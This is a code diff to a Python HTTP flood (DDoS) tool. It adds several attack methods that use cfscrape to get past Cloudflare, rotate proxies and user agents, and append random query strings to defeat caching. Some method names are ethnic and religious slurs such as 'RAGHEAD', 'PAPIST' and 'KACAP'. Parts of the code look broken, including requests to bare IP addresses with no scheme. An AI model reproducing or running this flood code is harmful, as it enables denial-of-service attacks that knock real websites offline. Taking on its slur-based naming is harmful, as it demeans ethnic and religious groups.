@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, sys, random
+import os, sys, random, string
 try:
     import socks, requests, wget, cfscrape, urllib3, ssl
 except:
@@ -9,7 +9,7 @@ except:
         os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy ssl")
     else:
         os.system("pip install pysocks requests wget cfscrape urllib3 scapy ssl")
-    import socks, requests, wget, cfscrape, urllib3
+    import socks, requests, wget, cfscrape, urllib3, ssl
  
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -32,7 +32,7 @@ from sys import argv
 from sys import exit as _exit
 from threading import Event, Thread
 from time import sleep, time
-from typing import Any, List, Set, Tuple
+from typing import Any, List, Set, Tuple, final
 from urllib import parse
 from urllib.parse import urlparse
 from uuid import UUID, uuid4
@@ -128,7 +128,9 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "RAGHEAD", "PAPIST", "TANKIE_SPECIAL", "KACAP",
+        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "CFTANKIE3", "CFTANKIE4", "TANKIE_SPECIAL",
+        "CFPAPIST", "CFRAGHEAD", "AMAMI_CANON", "AMAMI_CANON2",
+        "RAGHEAD", "PAPIST", "KACAP", "LOIC", "LOIC_CF",
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
@@ -304,6 +306,11 @@ class Tools:
                 return s
 
         return False
+
+    @staticmethod
+    def randomname(n):
+       randlst = [random.choice(string.ascii_letters + string.digits) for i in range(n)]
+       return ''.join(randlst)
 
     @staticmethod
     def safe_close(sock=None):
@@ -715,6 +722,10 @@ class HttpFlood(Thread):
             "CFTANKIE2": self.CFTANKIE2,
             "CFFUNDIE": self.CFFUNDIE,
             "CFFUNDIE2": self.CFFUNDIE2,
+            "CFTANKIE3": self.CFTANKIE3,
+            "CFTANKIE4": self.CFTANKIE4,
+            "CFPAPIST": self.CFPAPIST,
+            "CFRAGHEAD": self.CFRAGHEAD,
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
@@ -722,12 +733,16 @@ class HttpFlood(Thread):
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
             "KACAP": self.KACAP,
+            "LOIC": self.LOIC,
+            "LOIC_CF": self.LOIC_CF,
             "DGB": self.DGB,
             "OVH": self.OVH,
             "AVB": self.AVB,
             "RAGHEAD": self.RAGHEAD,
             "TANKIE_SPECIAL": self.TANKIE_SPECIAL,
             "PAPIST" : self.PAPIST,
+            "AMAMI_CANON" : self.AMAMI_CANON,
+            "AMAMI_CANON2" : self.AMAMI_CANON2,
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
@@ -866,7 +881,9 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "FUNDIE", 
+        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "CFTANKIE3", "CFTANKIE4", 
+                                            "TANKIE_SPECIAL", "CFPAPIST", "CFRAGHEAD", "AMAMI_CANON", "AMAMI_CANON2",
+                                            "KACAP", "PAPIST", "RAGHEAD", "LOIC", "LOIC_CF",
                                             "CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
@@ -1055,7 +1072,52 @@ class HttpFlood(Thread):
                     with s.get(str(self._target), timeout=15) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.post(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=15) as res:
+                    with s.post(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=15) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def CFTANKIE3(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    if pro:
+                        with s.get(socket.gethostbyname(str(self._target)) + "?=" + str(random.randint(0,20000)),
+                                   proxies=pro.asRequest(), timeout=15) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def CFTANKIE4(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    print(socket.gethostbyname(str(self._target)))
+                    with s.get("http://" + socket.gethostbyname(str(self._target)), timeout=15) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.post("http://" + socket.gethostbyname(str(self._target)) + "?=" + str(random.randint(0,20000)), timeout=15) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -1081,7 +1143,7 @@ class HttpFlood(Thread):
 
         cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        http = urllib3.PoolManager()
+        #http = urllib3.PoolManager()
         headersx={"Host" : str(self._host),
         "Connection" : "keep-alive",
         "Cache-Control" : "max-age=0",
@@ -1116,7 +1178,7 @@ class HttpFlood(Thread):
 
         cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        http = urllib3.PoolManager()
+        #http = urllib3.PoolManager()
         headersx={"Host" : str(self._host),
         "Connection" : "keep-alive",
         "Cache-Control" : "max-age=0",
@@ -1141,6 +1203,121 @@ class HttpFlood(Thread):
             except:
                 sleep(random.randint(10,15))
         Tools.safe_close(s)
+
+    def CFPAPIST(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        #http = urllib3.PoolManager()
+        headersx={"Host" : socket.gethostbyname(str(self._host)),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
+        "Sec-Fetch-Site": "same-origin"}
+
+        s = None
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    if pro:
+                        with s.get(socket.gethostbyname(str(self._host)), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                        with s.get(socket.gethostbyname(str(self._host)) + "?=" + str(random.randint(0,20000)),
+                                   proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def CFRAGHEAD(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        #http = urllib3.PoolManager()
+        headersx={"Host" : socket.gethostbyname(str(self._host)),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "jp,vi,cn,en;q=0.9,en-US;q=0.8,en-UK;q=0.5",
+        "Sec-Fetch-Site": "same-origin"}
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    with s.get(socket.gethostbyname(str(self._host)), headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.get(socket.gethostbyname(str(self._host)) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def LOIC_CF(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        headersx = {'User-Agent': randchoice(self._useragents)}
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        # Attacking
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+               for _ in range(self._rpc):
+                    if pro:
+                         with s.get(url, proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                    else:
+                         with s.get(url, headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def LOIC(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        headersx = {'User-Agent': randchoice(self._useragents)}
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        # Attacking
+        try:
+           for _ in range(self._rpc):
+                if pro:
+                     with requests.get(url, proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                else:
+                     with requests.get(url, headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+        except:
+            sleep(random.randint(10,15))
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1248,6 +1425,97 @@ class HttpFlood(Thread):
         except:
             s.close()
 
+    def KACAP(self):
+        global REQUESTS_SENT, BYTES_SEND
+
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, compress, br, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+
+        # Attacking
+        try:
+           for _ in range(self._rpc):
+               requests.get(url, headers=headersx)
+               requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
+        except:
+            sleep(random.randint(10,15))
+
+    def AMAMI_CANON(self):
+        global REQUESTS_SENT, BYTES_SEND
+
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Upgrade-Insecure-Requests" : "1",
+        "Sec-GPC": "1",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Dest": "document",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, compress, br, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+
+        attack_header = int(random.randint(0,3))
+
+        if attack_header == 0:
+            headersx["Cache-Control"] = "max-age=0"
+        elif attack_header == 1:
+            headersx["Cache-Control"] = "no-cache"
+        elif attack_header == 2:
+            headersx["Cache-Control"] = "no-store"
+        elif attack_header == 3:
+            headersx["Cache-Control"] = "private"
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        scraper = cfscrape.create_scraper()
+
+        # Attacking
+        try:
+           for _ in range(self._rpc):
+               scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)
+               scraper.get(url+ "/?=" +str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=15)
+        except:
+            sleep(random.randint(10,15))
+        finally:
+            Tools.safe_close(scraper)
+
+    def AMAMI_CANON2(self):
+        global REQUESTS_SENT, BYTES_SEND
+
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,500000)), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        continue
+                    with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,20))), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        continue
+            except:
+                sleep(random.randint(10,15))
+            finally:
+                Tools.safe_close(s)
+
+
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
@@ -1318,30 +1586,6 @@ class HttpFlood(Thread):
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
-
-    def KACAP(self):
-        global REQUESTS_SENT, BYTES_SEND
-
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-
-        headersx={"Host" : str(self._host),
-        "Connection" : "keep-alive",
-        "Cache-Control" : "max-age=0",
-        "Upgrade-Insecure-Requests" : "1",
-        "User-Agent" : randchoice(self._useragents),
-        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-        "Accept-Encoding" : "gzip, compress, br, deflate",
-        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
-
-        # Attacking
-        try:
-           for _ in range(self._rpc):
-               requests.get(url, headers=headersx)
-               requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
-        except:
-            sleep(random.randint(10,15))
 
     def GSB(self):
         payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
@@ -2028,7 +2272,7 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 # get the up-to-date proxies
-                DownloadProxies(proxy_ty, proxy_li)
+                #DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
